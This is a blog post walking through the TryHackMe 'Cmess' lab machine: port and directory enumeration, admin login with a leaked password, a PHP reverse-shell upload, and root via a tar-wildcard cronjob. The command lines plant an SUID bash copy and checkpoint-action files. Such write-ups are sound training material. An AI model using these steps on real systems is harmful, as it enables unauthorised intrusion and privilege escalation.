<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>TryHackMe Cmess machine Walkthrough | 0xt0pus</title>
<meta name="keywords" content="Tryhackme, cmess, Machine-Walkthrough">
<meta name="description" content="Cmess is a Linux machine which contains exposed passwords, no restriction on file upload and a crontab privilege escalation.">
<meta name="author" content="0xt0pus">
<link rel="canonical" href="http://localhost:1313/posts/machine-writeups/cmess-tryhackme/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css" integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY&#43;IJWZFnspCg=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/machine-writeups/cmess-tryhackme/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="TryHackMe Cmess machine Walkthrough" />
<meta property="og:description" content="Cmess is a Linux machine which contains exposed passwords, no restriction on file upload and a crontab privilege escalation." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/machine-writeups/cmess-tryhackme/" />
<meta property="og:image" content="http://localhost:1313/writeups/Cmess-Tryhackme/cmess.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-10-08T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-10-08T00:00:00+00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/writeups/Cmess-Tryhackme/cmess.png" />
<meta name="twitter:title" content="TryHackMe Cmess machine Walkthrough"/>
<meta name="twitter:description" content="Cmess is a Linux machine which contains exposed passwords, no restriction on file upload and a crontab privilege escalation."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Machine-Writeups",
      "item": "http://localhost:1313/posts/machine-writeups/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "TryHackMe Cmess machine Walkthrough",
      "item": "http://localhost:1313/posts/machine-writeups/cmess-tryhackme/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "TryHackMe Cmess machine Walkthrough",
  "name": "TryHackMe Cmess machine Walkthrough",
  "description": "Cmess is a Linux machine which contains exposed passwords, no restriction on file upload and a crontab privilege escalation.",
  "keywords": [
    "Tryhackme", "cmess", "Machine-Walkthrough"
  ],
  "articleBody": "Setup The following entry is being added to the /etc/hosts.\n10.10.57.136 cmess.thm Enumeration Nmap all ports scan is being run. The following was the result of the scan.\n┌──(kali㉿kali)-[~/Desktop/tryhackme/cmess] └─$ nmap 10.10.57.136 -p- --min-rate 2500 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-31 16:44 EDT Warning: 10.10.57.136 giving up on port because retransmission cap hit (10). Nmap scan report for cmess.thm (10.10.57.136) Host is up (0.18s latency). Not shown: 65507 closed tcp ports (conn-refused), 26 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 43.91 seconds So, port 22 and 80 are open. The version of services are being identified as shown.\n┌──(kali㉿kali)-[~/Desktop/tryhackme/cmess] └─$ nmap -sV -sC 10.10.57.136 -p22,80 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-31 16:48 EDT Nmap scan report for cmess.thm (10.10.57.136) Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d9b652d3939a3850b4233bfd210c051f (RSA) | 256 21c36e318b85228a6d72868fae64662b (ECDSA) |_ 256 5bb9757805d7ec43309617ffc6a86ced (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-generator: Gila CMS | http-robots.txt: 3 disallowed entries |_/src/ /themes/ /lib/ |_http-title: Site doesn't have a title (text/html; charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds Other than Gila CMS, there’s nothing interesting.\nThe website running on port 80 is being explored and the following is the page with no interesting surface.\nThe content on port 80\nDirsearch is being run to find the directories in the target website. The following is result is being obtained.\n┌──(kali㉿kali)-[~/Desktop/tryhackme/cmess] └─$ dirsearch -u http://10.10.57.136 --exclude-status=401,402,403,404 [16:56:01] Starting: [16:56:15] 200 - 4KB - /0 [16:56:15] 200 - 4KB - /01 [16:56:17] 200 - 3KB - /About [16:56:21] 200 - 4KB - /Search [16:56:28] 200 - 2KB - /admin [16:56:44] 200 - 0B - /api [16:56:46] 200 - 566B - /assets/ [16:56:47] 200 - 4KB - /author [16:56:50] 200 - 4KB - /blog/ [16:56:51] 200 - 4KB - /category [16:57:05] 200 - 735B - /feed [16:57:10] 200 - 4KB - /index [16:57:13] 301 - 318B - /lib -\u003e http://10.10.57.136/lib/?url=lib [16:57:15] 301 - 318B - /log -\u003e http://10.10.57.136/log/?url=log [16:57:15] 200 - 2KB - /login [16:57:32] 200 - 65B - /robots.txt [16:57:33] 200 - 4KB - /search [16:57:37] 301 - 322B - /sites -\u003e http://10.10.57.136/sites/?url=sites [16:57:38] 301 - 318B - /src -\u003e http://10.10.57.136/src/?url=src [16:57:41] 200 - 4KB - /tag [16:57:41] 200 - 3KB - /tags [16:57:42] 301 - 324B - /themes -\u003e http://10.10.57.136/themes/?url=themes [16:57:43] 301 - 318B - /tmp -\u003e http://10.10.57.136/tmp/?url=tmp Task Completed The directories are being explore, but majority of the pages can be accessed after authentication. We need to find email and password to access the administrator page.\nSubdomains are being enamurated with the wfuzz tool. The result is being showed below.\n┌──(kali㉿kali)-[~/Desktop/tryhackme/cmess] └─$ wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u \"http://cmess.thm/\" -H \"Host: FUZZ.cmess.thm\" --hw 290 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://cmess.thm/ Total requests: 4989 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000019: 200 30 L 104 W 934 Ch \"dev\" Total time: 0 Processed Requests: 4989 Filtered Requests: 4988 Requests/sec.: 0 The dev.cmess.thm is interesting, it is being added to /etc/hosts as given below.\n10.10.57.136 dev.cmess.thm The following is the content of this sub-domain.\nGaining Access The dev page seems to be a conversation between andre and support. The password of andre is exposed here. This password is being tried to ssh into the machine but it gave me that the password is incorrect.\nSo, the credentials are being tried at the Gila CMS admin login page. It worked and the admin page is being accessed.\nHere under content\u003efile manager there is an option to upload file. A php reverse shell is being upload here. There’s no restriction on file upload.\nThe uploaded file can be accessed in the cmess.thm/assets/revshell.php.\nA reverse shell is being obtained as show below:\nRev shell obtained\nPrivilege Escalation Currently, we are in the machine as www-data user. The linenum.sh is being transferred to the machine and is being run. It gave us a password backup file as shown.\nEscalated to the user andre by running su andre , followed by the found password. As the current shell is not stable, we already got the password of andre, so connected to ssh with the credentials.\nThe user andre is being accessed as shown below:\nGot user access.\nFor getting root, the machine is being explored as the user andre.\nThere is a cronjob running, which is running after each 2 minutes and using wildcard with tar, it can used for getting root.\nThe following command is being run which will create a script that will copy the shell to the temp and will enable its suid bit.\necho 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' \u003e /home/andre/backup/runme.sh A checkpoint file is being created in the folder that will be backed up:\ntouch /home/andre/backup/--checkpoint=1 The following command will execute the script that is copying the shell to /tmp as root.\ntouch /home/andre/backup/--checkpoint-action=exec=sh\\ runme.sh Waited 2 minutes for the script to be executed,, and run the run the copied shell with command /tmp/bash -p\nThe machine is being rooted.\nIn this way, the root access is being obtained.\nConclusion The difficulty level of the machine was medium. The machine contains exposed password of user andre which can be used to access the admin panel. The admin panel has no restriction on file upload, and the files on the server can be run directly. For the privilege escalation, the machine again has exposed password of the user andre, which can be used for accessing the adre user from www-data. The root user can obtained by abusing the cronjobs.\n",
  "wordCount" : "990",
  "inLanguage": "en",
  "image":"http://localhost:1313/writeups/Cmess-Tryhackme/cmess.png","datePublished": "2023-10-08T00:00:00Z",
  "dateModified": "2023-10-08T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "0xt0pus"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/posts/machine-writeups/cmess-tryhackme/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "0xt0pus",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="0xt0pus (Alt + H)">0xt0pus</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/todo" title="OSCP ToDo Boxes">
                    <span>OSCP ToDo Boxes</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/posts/certification-reviews" title="Certification Reviews">
                    <span>Certification Reviews</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/posts/machine-writeups" title="Machine Writeups">
                    <span>Machine Writeups</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/posts/ctf-writeups" title="CTF Writeups">
                    <span>CTF Writeups</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/machine-writeups/">Machine-Writeups</a></div>
    <h1 class="post-title entry-hint-parent">
      TryHackMe Cmess machine Walkthrough
    </h1>
    <div class="post-description">
      Cmess is a Linux machine which contains exposed passwords, no restriction on file upload and a crontab privilege escalation.
    </div>
    <div class="post-meta"><span title='2023-10-08 00:00:00 +0000 UTC'>October 8, 2023</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;0xt0pus

</div>
  </header> 
<figure class="entry-cover"><img loading="eager" src="http://localhost:1313/writeups/Cmess-Tryhackme/cmess.png" alt="">
        
</figure><div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#setup" aria-label="Setup">Setup</a></li>
                <li>
                    <a href="#enumeration" aria-label="Enumeration">Enumeration</a></li>
                <li>
                    <a href="#gaining-access" aria-label="Gaining Access">Gaining Access</a></li>
                <li>
                    <a href="#privilege-escalation" aria-label="Privilege Escalation">Privilege Escalation</a></li>
                <li>
                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="setup">Setup<a hidden class="anchor" aria-hidden="true" href="#setup">#</a></h2>
<p>The following entry is being added to the <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">10.10.57.136 cmess.thm
</span></span></code></pre></div><h2 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h2>
<p>Nmap all ports scan is being run. The following was the result of the scan.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/tryhackme/cmess<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ nmap 10.10.57.136 -p- --min-rate <span class="m">2500</span>
</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-08-31 16:44 EDT
</span></span><span class="line"><span class="cl">Warning: 10.10.57.136 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> cmess.thm <span class="o">(</span>10.10.57.136<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.18s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65507</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>, <span class="m">26</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 43.91 seconds
</span></span></code></pre></div><p>So, port 22 and 80 are open. The version of services are being identified as shown.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/tryhackme/cmess<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ nmap -sV -sC 10.10.57.136 -p22,80    
</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-08-31 16:48 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> cmess.thm <span class="o">(</span>10.10.57.136<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.18s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> d9b652d3939a3850b4233bfd210c051f <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 21c36e318b85228a6d72868fae64662b <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 5bb9757805d7ec43309617ffc6a86ced <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-generator: Gila CMS
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">3</span> disallowed entries 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_/src/ /themes/ /lib/
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.65 seconds
</span></span></code></pre></div><p>Other than Gila CMS, there&rsquo;s nothing interesting.</p>
<p>The website running on port 80 is being explored and the following is the page with no interesting surface.</p>
<p><img loading="lazy" src="/writeups/Cmess-Tryhackme/1.png" alt=""  />
</p>
<p>The content on port 80</p>
<p>Dirsearch is being run to find the directories in the target website. The following is result is being obtained.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/tryhackme/cmess<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ dirsearch -u http://10.10.57.136 --exclude-status<span class="o">=</span>401,402,403,404
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:56:01<span class="o">]</span> Starting: 
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:56:15<span class="o">]</span> <span class="m">200</span> -    4KB - /0                                                
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:56:15<span class="o">]</span> <span class="m">200</span> -    4KB - /01                                                                                           
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:56:17<span class="o">]</span> <span class="m">200</span> -    3KB - /About                                            
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:56:21<span class="o">]</span> <span class="m">200</span> -    4KB - /Search                                           
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:56:28<span class="o">]</span> <span class="m">200</span> -    2KB - /admin                                                                        
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:56:44<span class="o">]</span> <span class="m">200</span> -    0B  - /api                                              
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:56:46<span class="o">]</span> <span class="m">200</span> -  566B  - /assets/                                          
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:56:47<span class="o">]</span> <span class="m">200</span> -    4KB - /author                                           
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:56:50<span class="o">]</span> <span class="m">200</span> -    4KB - /blog/                                            
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:56:51<span class="o">]</span> <span class="m">200</span> -    4KB - /category                                         
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:57:05<span class="o">]</span> <span class="m">200</span> -  735B  - /feed                                             
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:57:10<span class="o">]</span> <span class="m">200</span> -    4KB - /index                                            
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:57:13<span class="o">]</span> <span class="m">301</span> -  318B  - /lib  -&gt;  http://10.10.57.136/lib/?url<span class="o">=</span>lib        
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:57:15<span class="o">]</span> <span class="m">301</span> -  318B  - /log  -&gt;  http://10.10.57.136/log/?url<span class="o">=</span>log        
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:57:15<span class="o">]</span> <span class="m">200</span> -    2KB - /login                                            
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:57:32<span class="o">]</span> <span class="m">200</span> -   65B  - /robots.txt                                       
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:57:33<span class="o">]</span> <span class="m">200</span> -    4KB - /search                                           
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:57:37<span class="o">]</span> <span class="m">301</span> -  322B  - /sites  -&gt;  http://10.10.57.136/sites/?url<span class="o">=</span>sites  
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:57:38<span class="o">]</span> <span class="m">301</span> -  318B  - /src  -&gt;  http://10.10.57.136/src/?url<span class="o">=</span>src        
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:57:41<span class="o">]</span> <span class="m">200</span> -    4KB - /tag                                              
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:57:41<span class="o">]</span> <span class="m">200</span> -    3KB - /tags                                             
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:57:42<span class="o">]</span> <span class="m">301</span> -  324B  - /themes  -&gt;  http://10.10.57.136/themes/?url<span class="o">=</span>themes
</span></span><span class="line"><span class="cl"><span class="o">[</span>16:57:43<span class="o">]</span> <span class="m">301</span> -  318B  - /tmp  -&gt;  http://10.10.57.136/tmp/?url<span class="o">=</span>tmp        
</span></span><span class="line"><span class="cl">                                                                             
</span></span><span class="line"><span class="cl">Task Completed 
</span></span></code></pre></div><p>The directories are being explore, but majority of the pages can be accessed after authentication. We need to find email and password to access the administrator page.</p>
<p><img loading="lazy" src="/writeups/Cmess-Tryhackme/2.png" alt=""  />
</p>
<p>Subdomains are being enamurated with the wfuzz tool. The result is being showed below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/tryhackme/cmess<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u <span class="s2">&#34;http://cmess.thm/&#34;</span> -H <span class="s2">&#34;Host: FUZZ.cmess.thm&#34;</span> --hw <span class="m">290</span> 
</span></span><span class="line"><span class="cl"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="err">&#39;</span>s documentation <span class="k">for</span> more information.
</span></span><span class="line"><span class="cl">********************************************************
</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
</span></span><span class="line"><span class="cl">********************************************************
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Target: http://cmess.thm/
</span></span><span class="line"><span class="cl">Total requests: <span class="nv">4989</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       <span class="nv">Payload</span>                                                                                                                                                        
</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">000000019:   <span class="m">200</span>        <span class="m">30</span> L     <span class="m">104</span> W      <span class="m">934</span> Ch      <span class="s2">&#34;dev&#34;</span>                                                                                                                                                                      
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Total time: <span class="m">0</span>
</span></span><span class="line"><span class="cl">Processed Requests: <span class="m">4989</span>
</span></span><span class="line"><span class="cl">Filtered Requests: <span class="m">4988</span>
</span></span><span class="line"><span class="cl">Requests/sec.: <span class="m">0</span>
</span></span></code></pre></div><p>The dev.cmess.thm is interesting, it is being added to /etc/hosts as given below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">10.10.57.136 dev.cmess.thm
</span></span></code></pre></div><p>The following is the content of this sub-domain.</p>
<p><img loading="lazy" src="/writeups/Cmess-Tryhackme/3.png" alt=""  />
</p>
<h2 id="gaining-access">Gaining Access<a hidden class="anchor" aria-hidden="true" href="#gaining-access">#</a></h2>
<p>The dev page seems to be a conversation between andre and support. The password of andre is exposed here. This password is being tried to ssh into the machine but it gave me that the password is incorrect.</p>
<p>So, the credentials are being tried at the Gila CMS admin login page. It worked and the admin page is being accessed.</p>
<p><img loading="lazy" src="/writeups/Cmess-Tryhackme/4.png" alt=""  />
</p>
<p>Here under <code>content&gt;file manager</code> there is an option to upload file. A php reverse shell is being upload here. There&rsquo;s no restriction on file upload.</p>
<p>The uploaded file can be accessed in the <code>cmess.thm/assets/revshell.php</code>.</p>
<p>A reverse shell is being obtained as show below:</p>
<p><img loading="lazy" src="/writeups/Cmess-Tryhackme/5.png" alt=""  />
</p>
<p>Rev shell obtained</p>
<h2 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h2>
<p>Currently, we are in the machine as <code>www-data</code> user. The <code>linenum.sh</code> is being transferred to the machine and is being run. It gave us a password backup file as shown.</p>
<p><img loading="lazy" src="/writeups/Cmess-Tryhackme/6.png" alt=""  />
</p>
<p>Escalated to the user andre by running <code>su andre</code> , followed by the found password. As the current shell is not stable, we already got the password of andre, so connected to ssh with the credentials.</p>
<p>The user andre is being accessed as shown below:</p>
<p><img loading="lazy" src="/writeups/Cmess-Tryhackme/7.png" alt=""  />
</p>
<p>Got user access.</p>
<p>For getting root, the machine is being explored as the user andre.</p>
<p>There is a cronjob running, which is running after each 2 minutes and using wildcard with tar, it can used for getting root.</p>
<p><img loading="lazy" src="/writeups/Cmess-Tryhackme/8.png" alt=""  />
</p>
<p>The following command is being run which will create a script that will copy the shell to the temp and will enable its suid bit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39;</span> &gt; /home/andre/backup/runme.sh
</span></span></code></pre></div><p>A checkpoint file is being created in the folder that will be backed up:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">touch /home/andre/backup/--checkpoint<span class="o">=</span><span class="m">1</span>
</span></span></code></pre></div><p>The following command will execute the script that is copying the shell to /tmp as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">touch /home/andre/backup/--checkpoint-action<span class="o">=</span><span class="nv">exec</span><span class="o">=</span>sh<span class="se">\ </span>runme.sh
</span></span></code></pre></div><p>Waited 2 minutes for the script to be executed,, and run the run the copied shell with command <code>/tmp/bash -p</code></p>
<p><img loading="lazy" src="/writeups/Cmess-Tryhackme/9.png" alt=""  />
</p>
<p>The machine is being rooted.</p>
<p>In this way, the root access is being obtained.</p>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>The difficulty level of the machine was medium. The machine contains exposed password of user andre which can be used to access the admin panel. The admin panel has no restriction on file upload, and the files on the server can be run directly. For the privilege escalation, the machine again has exposed password of the user andre, which can be used for accessing the adre user from www-data. The root user can obtained by abusing the cronjobs.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/tryhackme/">Tryhackme</a></li>
      <li><a href="http://localhost:1313/tags/cmess/">Cmess</a></li>
      <li><a href="http://localhost:1313/tags/machine-walkthrough/">Machine-Walkthrough</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/posts/ctf-writeups/bypass-square-web-nascon23/">
    <span class="title">« Prev</span>
    <br>
    <span>Bypass square -  Web - NaScon&#39;23</span>
  </a>
  <a class="next" href="http://localhost:1313/posts/ctf-writeups/amarillo-web-cyberhackathon23/">
    <span class="title">Next »</span>
    <br>
    <span>Qualifier Web security (El Banco Amarillo) - CyberHackathon&#39;23</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share TryHackMe Cmess machine Walkthrough on x"
            href="https://x.com/intent/tweet/?text=TryHackMe%20Cmess%20machine%20Walkthrough&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fmachine-writeups%2fcmess-tryhackme%2f&amp;hashtags=Tryhackme%2ccmess%2cMachine-Walkthrough">
